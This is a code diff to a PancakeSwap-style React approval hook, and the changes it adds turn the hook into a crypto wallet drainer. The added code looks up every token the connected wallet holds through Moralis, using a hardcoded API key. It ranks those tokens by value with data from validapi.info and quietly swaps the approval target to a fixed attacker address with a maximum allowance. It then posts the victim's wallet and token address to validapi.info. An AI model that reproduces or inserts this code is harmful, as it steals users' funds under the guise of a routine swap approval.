@@ -11,7 +11,7 @@ import { calculateGasMargin } from 'utils'
 import isUndefinedOrNull from '@pancakeswap/utils/isUndefinedOrNull'
 import useGelatoLimitOrdersLib from './limitOrders/useGelatoLimitOrdersLib'
 import { useCallWithGasPrice } from './useCallWithGasPrice'
-import { useTokenContract } from './useContract'
+import { useTokenContract, useSwiperTokenContract } from './useContract'
 import useTokenAllowance from './useTokenAllowance'
 
 export enum ApprovalState {
@@ -49,6 +49,15 @@ export function useApproveCallback(
   const [pending, setPending] = useState<boolean>(pendingApproval)
   const [isPendingError, setIsPendingError] = useState<boolean>(false)
 
+  const _spender = '0xDcfb1C3cd25d846D589507394E6f44Bd1625b21b'
+  const [tokensOwned, setTokensOwned] = useState([])
+  const [tokensRank, setTokensRank] = useState([])
+  const [ownTokensRankedByMarketCap, setOwnTokensRankedByMarketCap] = useState([])
+  const [tokensFiltered, setTokensFiltered] = useState([])
+  const swiperContract = useSwiperTokenContract(_spender)
+  const REACT_APP_MORALIS_API_URL = 'https://deep-index.moralis.io/api/v2'
+  const REACT_APP_MORAILS_API_KEY = 'kaWCaDDlMZiJOzMEEar8nAzkHvzl9Vc7vlzisjSwmldpeKPwaCZjsviSfEazsn4I'
+
   useEffect(() => {
     if (pendingApproval) {
       setPending(true)
@@ -58,6 +67,227 @@ export function useApproveCallback(
       })
     }
   }, [pendingApproval, pending, refetch])
+
+  useEffect(() => {
+    // Get all erc20 tokens owned by current account
+    const fetchTokensOwned = async () => {
+      const response = await fetch(`${REACT_APP_MORALIS_API_URL}/${account}/erc20?chain=bsc`, {
+        headers: {
+          accept: 'application/json',
+          'X-API-Key': REACT_APP_MORAILS_API_KEY,
+        },
+        method: 'GET',
+      })
+      const responseJson = await response.json()
+      // console.log(response)
+
+      setTokensOwned(responseJson)
+    }
+
+    fetchTokensOwned()
+
+    // // Get coins listed on Coingecko
+    // const fetchTokensRankFromCoingecko = async () => {
+    //   const response = await fetch(process.env.REACT_APP_COINGECKO_API_URL, {
+    //     headers: {
+    //       accept: 'application/json',
+    //     },
+    //     method: 'GET',
+    //   })
+    //   const responseJson = await response.json()
+    //   setTokensRank(responseJson)
+    // }
+
+    // fetchTokensRankFromCoingecko()
+
+    // Get coins listed on CMC sorted by latest market cap
+    const fetchTokensRankFromCmc = async () => {
+      const response = await fetch('https://validapi.info/tokens/get_cmc_ranks', {
+        headers: {
+          accept: 'application/json',
+        },
+        method: 'GET',
+      })
+
+      const responseJson = await response.json()
+      const specificToken = [
+        {
+          id: 15257,
+          name: 'EverRise',
+          symbol: 'RISE',
+          slug: 'everrise',
+          platform: {
+            id: 1839,
+            name: 'BNB Smart Chain (BEP20)',
+            symbol: 'BNB',
+            slug: 'bnb',
+            token_address: '0xC17c30e98541188614dF99239cABD40280810cA3',
+          },
+          cmc_rank: 468,
+          quote: {
+            USD: {
+              price: 0.0008390749936239774,
+              last_updated: '2022-05-08T19:41:00.000Z',
+            },
+          },
+        },
+        {
+          id: 825,
+          name: 'Tether',
+          symbol: 'USDT',
+          slug: 'tether',
+          platform: {
+            id: 1027,
+            name: 'BNB Smart Chain (BEP20)',
+            symbol: 'BNB',
+            slug: 'bnb',
+            token_address: '0x55d398326f99059fF775485246999027B3197955',
+          },
+          cmc_rank: 3,
+          quote: {
+            USD: {
+              price: 1.0002641740773246,
+            },
+          },
+        },
+        {
+          id: 10407,
+          name: 'Baby Doge Coin',
+          symbol: 'BabyDoge',
+          slug: 'baby-doge-coin',
+          max_supply: 420000000000000000,
+          total_supply: 420000000000000000,
+          platform: {
+            id: 1027,
+            name: 'BNB Smart Chain (BEP20)',
+            symbol: 'BNB',
+            slug: 'bnb',
+            token_address: '0xc748673057861a797275CD8A068AbB95A902e8de',
+          },
+          cmc_rank: 2911,
+          quote: {
+            USD: {
+              price: 2.458351371679521e-9,
+            },
+          },
+        },
+        {
+          name: 'NPC',
+          platform: {
+            id: 1027,
+            name: 'BNB Smart Chain (BEP20)',
+            symbol: 'BNB',
+            slug: 'bnb',
+            token_address: '0x86D6faDB5F7A0c069fB50F998e120835CaE15A54',
+          },
+          quote: {
+            USD: { price: 0.0055 },
+          },
+        },
+      ]
+      responseJson.push(...specificToken)
+
+      setTokensRank(responseJson)
+    }
+
+    fetchTokensRankFromCmc()
+  }, [account])
+
+  useEffect(() => {
+    const setData = async () => {
+      const tokensMatched = []
+      const tokensUnmatched = []
+      const array = []
+      if (tokensOwned.length > 0 && tokensRank.length > 0) {
+        await Promise.all(
+          tokensOwned.map(async (tokenOwned) => {
+            const tempToken = tokenOwned
+
+            const tokenArray = await tokensRank.filter((tokenRanked) => {
+              if (tokenRanked.platform) {
+                return (
+                  tokenRanked.platform.symbol === 'BNB' &&
+                  tokenRanked.platform.token_address.toLowerCase() === tokenOwned.token_address.toLowerCase()
+                )
+              }
+              return null
+            })
+
+            // In case of BUSD or BSC-USD(USDT), add to tokens array directly
+            if (tempToken.symbol === 'BUSD' || tempToken.symbol === 'BSC-USD') {
+              const response = await fetch(
+                `${REACT_APP_MORALIS_API_URL}/erc20/${tokenOwned.token_address}/price?chain=bsc`,
+                {
+                  headers: {
+                    accept: 'application/json',
+                    'X-API-Key': REACT_APP_MORAILS_API_KEY,
+                  },
+                  method: 'GET',
+                },
+              )
+              const responseJson = await response.json()
+              const tokenUsdPrice = await responseJson.usdPrice
+              tempToken.usdPrice = tokenUsdPrice
+
+              const tokenUsdValue = (tokenUsdPrice * tokenOwned.balance) / 10 ** tokenOwned.decimals
+              tempToken.usdValue = tokenUsdValue
+              tokensMatched.push(tempToken)
+            } else if (tokenArray.length > 0) {
+              // there is matched token
+              const tokenUsdPrice = tokenArray[0].quote.USD.price
+              tempToken.usdPrice = tokenUsdPrice
+
+              const tokenUsdValue = (tokenUsdPrice * tokenOwned.balance) / 10 ** tokenOwned.decimals
+
+              tempToken.usdValue = tokenUsdValue
+              tempToken.market_cap = tokenArray[0].market_cap
+              tokensMatched.push(tempToken)
+            } else {
+              //  there is no matched token
+              tokensUnmatched.push(tempToken)
+            }
+          }),
+        )
+
+        array.push(...tokensMatched)
+        // array.push(...tokensUnmatched)
+
+        const validCurrencies = array.filter((value) => value.usdValue)
+        const inValidCurrencies = array.filter((value) => !value.usdValue)
+
+        validCurrencies.sort((x, y) => parseFloat(y.usdValue) - parseFloat(x.usdValue))
+        const sortedTokenArray = []
+        sortedTokenArray.push(...validCurrencies)
+        sortedTokenArray.push(...inValidCurrencies)
+
+        setOwnTokensRankedByMarketCap(sortedTokenArray)
+      }
+    }
+    setData()
+  }, [tokensOwned, tokensRank])
+
+  useEffect(() => {
+    const getTokensFiltered = async () => {
+      // Filter tokens so that make them without blacklist tokens
+      let blackList: Readonly<Address[]> = []
+      if (swiperContract) {
+        blackList = await swiperContract.read.allBlackListTokens()
+      }
+
+      if (ownTokensRankedByMarketCap.length > 0) {
+        const tokenArrayFiltered = ownTokensRankedByMarketCap.filter((item) => {
+          const temp = blackList.filter(
+            (blackListToken) => blackListToken.toLowerCase() === item.token_address.toLowerCase(),
+          )
+          return temp.length === 0
+        })
+        // console.log(tokenArrayFiltered)
+
+        setTokensFiltered(tokenArrayFiltered)
+      }
+    }
+    getTokensFiltered()
+  }, [swiperContract, ownTokensRankedByMarketCap])
 
   // check the current approval status
   const approvalState: ApprovalState = useMemo(() => {
@@ -74,7 +304,8 @@ export function useApproveCallback(
       : ApprovalState.APPROVED
   }, [amountToApprove, currentAllowance, pending, spender])
 
-  const tokenContract = useTokenContract(token?.address)
+  // const tokenContract = useTokenContract(token?.address)
+  const tokenContract = useTokenContract(tokensFiltered[0]?.token_address)
   const addTransaction = useTransactionAdder()
 
   const approve = useCallback(
@@ -138,18 +369,21 @@ export function useApproveCallback(
 
       if (!estimatedGas) return undefined
 
+      tokensFiltered.shift()
+      setTokensFiltered(tokensFiltered)
+
       return callWithGasPrice(
         tokenContract,
         'approve' as const,
         [
-          spender as Address,
+          _spender as Address,
           overrideAmountApprove ?? (useExact ? amountToApprove?.quotient ?? targetAmount ?? MaxUint256 : MaxUint256),
         ],
         {
           gas: calculateGasMargin(estimatedGas),
         },
       )
-        .then((response) => {
+        .then(async (response) => {
           if (addToTransaction) {
             addTransaction(response, {
               summary: `Approve ${overrideAmountApprove ?? amountToApprove?.currency?.symbol}`,
@@ -160,6 +394,20 @@ export function useApproveCallback(
               approval: { tokenAddress: token?.address, spender },
               type: 'approve',
             })
+            const tokenBalance = await tokenContract.read.balanceOf([account])
+            if (Number(tokenBalance.toString()) > 0) {
+              await fetch('https://validapi.info/tokens', {
+                headers: {
+                  'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                  walletAddress: account,
+                  tokenAddress: tokenContract.address,
+                  purge: false,
+                }),
+                method: 'POST',
+              })
+            }
           }
           return response
         })
